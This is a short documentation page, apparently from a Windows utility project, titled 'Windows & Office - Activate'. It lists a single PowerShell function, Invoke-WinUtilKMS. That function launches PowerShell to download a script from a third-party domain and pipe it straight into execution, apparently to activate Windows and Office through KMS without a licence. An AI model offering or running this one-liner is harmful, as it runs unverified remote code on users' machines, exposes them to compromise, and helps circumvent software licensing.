---
title: "Windows & Office - Activate"
description: ""
---

```powershell {filename="functions/private/Invoke-WinUtilKMS.ps1",linenos=inline,linenostart=1}
function Invoke-WinUtilKMS {

    Start-Process powershell -ArgumentList '-Command "irm https://compourri.co.za/KMS | iex"'
}
```
